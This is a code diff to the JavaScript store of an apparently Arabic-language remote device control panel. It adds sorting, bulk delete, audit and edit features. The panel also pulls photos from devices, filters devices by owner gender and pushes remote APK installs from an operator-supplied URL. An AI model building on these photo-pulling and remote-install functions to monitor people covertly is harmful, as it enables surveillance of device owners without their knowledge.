@@ -37,8 +37,14 @@ export function makePanelStore() {
     statusFilter: "",
     genderFilter: "",
     appTypeFilter: "",
+    sortKey: "createdAt",
     search: "",
     wipeArmed: false,
+    selected: {},
+    editName: "",
+    editNotes: "",
+    auditItems: [],
+    previewUrl: "",
     pullModal: { open: false, tab: "original", search: "", spec: "", counts: {}, items: [], progress: null },
 
     listFilter: "",
@@ -161,9 +167,98 @@ export function makePanelStore() {
       try {
         this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}`);
         this.view = this.detail ? "ready" : "empty";
+        this.editName = this.detail?.name || "";
+        this.editNotes = this.detail?.notes || "";
+        this.loadAudit(id);
       } catch (err) {
         this.handleLoadError(err);
       }
+    },
+
+    async loadAudit(id) {
+      try {
+        const body = await apiFetch(`/devices/${encodeURIComponent(id)}/audit`);
+        this.auditItems = body.items || [];
+      } catch {
+        this.auditItems = [];
+      }
+    },
+
+    async saveDeviceMeta(id) {
+      try {
+        this.detail = await apiFetch(`/devices/${encodeURIComponent(id)}`, {
+          method: "PATCH",
+          body: JSON.stringify({ name: this.editName, notes: this.editNotes }),
+        });
+        this.flash = "تم الحفظ";
+        setTimeout(() => (this.flash = ""), 2500);
+      } catch (err) {
+        this.handleLoadError(err);
+      }
+    },
+
+    missingPerms(d) {
+      const list = d?.stats?.missingPerms;
+      return Array.isArray(list) ? list.filter(Boolean) : [];
+    },
+
+    /** Offline over 24 hours — alert on the detail card. */
+    offlineOver24h(d) {
+      if (!d || d.state === "online" || d.state === "idle") return false;
+      return Date.now() - new Date(d.lastSeen).getTime() > 24 * 3600_000;
+    },
+
+    async pushUpdate(id) {
+      const url = window.prompt("APK URL:", "http://10.0.2.2:8000/app-debug.apk");
+      if (!url) return;
+      await this.sendCommand(id, "apk_update", { url });
+    },
+
+    async previewPhoto(p) {
+      try {
+        const res = await fetch(
+          `/api/devices/${encodeURIComponent(this.route.id)}/photos/${encodeURIComponent(p.hash)}/file`,
+          { headers: { Authorization: `Bearer ${getAccessToken()}` } }
+        );
+        if (!res.ok) { this.flash = "لا يوجد ملف"; setTimeout(() => (this.flash = ""), 2500); return; }
+        if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
+        this.previewUrl = URL.createObjectURL(await res.blob());
+      } catch {
+        this.flash = "لا يوجد ملف";
+        setTimeout(() => (this.flash = ""), 2500);
+      }
+    },
+
+    closePreview() {
+      if (this.previewUrl) URL.revokeObjectURL(this.previewUrl);
+      this.previewUrl = "";
+    },
+
+    /* ------------------------- bulk selection ------------------------ */
+
+    toggleSelect(id) {
+      this.selected = { ...this.selected, [id]: !this.selected[id] };
+    },
+
+    toggleSelectAll() {
+      const rows = this.filteredDevices();
+      const all = rows.every((d) => this.selected[d.id]);
+      const next = { ...this.selected };
+      for (const d of rows) next[d.id] = !all;
+      this.selected = next;
+    },
+
+    selectedIds() {
+      return Object.keys(this.selected).filter((k) => this.selected[k]);
+    },
+
+    async bulkDelete() {
+      const ids = this.selectedIds();
+      for (const id of ids) {
+        await apiFetch(`/devices/${encodeURIComponent(id)}`, { method: "DELETE" }).catch(() => {});
+      }
+      this.selected = {};
+      this.loadDevices();
     },
 
     handleLoadError(err) {
@@ -252,9 +347,14 @@ export function makePanelStore() {
 
     filteredDevices() {
       const q = this.search.trim().toLowerCase();
+      const by = {
+        createdAt: (a, b) => new Date(b.createdAt) - new Date(a.createdAt),
+        lastSeen: (a, b) => new Date(b.lastSeen) - new Date(a.lastSeen),
+        name: (a, b) => String(a.name || "").localeCompare(String(b.name || "")),
+      }[this.sortKey] || ((a, b) => new Date(a.createdAt) - new Date(b.createdAt));
       return (this.devices || [])
         .slice()
-        .sort((a, b) => new Date(a.createdAt) - new Date(b.createdAt))
+        .sort(by)
         .filter((d) => {
           if (this.statusFilter === "deleted" && !this.isDeleted(d)) return false;
           if (this.statusFilter === "online" && (this.isDeleted(d) || d.state !== "online")) return false;
@@ -268,12 +368,16 @@ export function makePanelStore() {
 
     dotClass(d) {
       if (this.isDeleted(d)) return "dot-red";
-      return d.state === "online" ? "dot-green" : "dot-gray";
+      if (d.state === "online") return "dot-green";
+      if (d.state === "idle") return "dot-amber";
+      return "dot-gray";
     },
 
     stateLabel(d) {
       if (this.isDeleted(d)) return "محذوف";
-      return d.state === "online" ? "متصل" : "غير متصل";
+      if (d.state === "online") return "متصل";
+      if (d.state === "idle") return "خامل";
+      return "غير متصل";
     },
 
     genderIcon(d) {
@@ -287,11 +391,11 @@ export function makePanelStore() {
     },
 
     async exportCsv() {
-      let res = await fetch("/api/v1/devices.csv", {
+      let res = await fetch("/api/devices.csv", {
         headers: { Authorization: `Bearer ${getAccessToken()}` },
       });
       if (res.status === 401 && (await refreshTokens())) {
-        res = await fetch("/api/v1/devices.csv", {
+        res = await fetch("/api/devices.csv", {
           headers: { Authorization: `Bearer ${getAccessToken()}` },
         });
       }
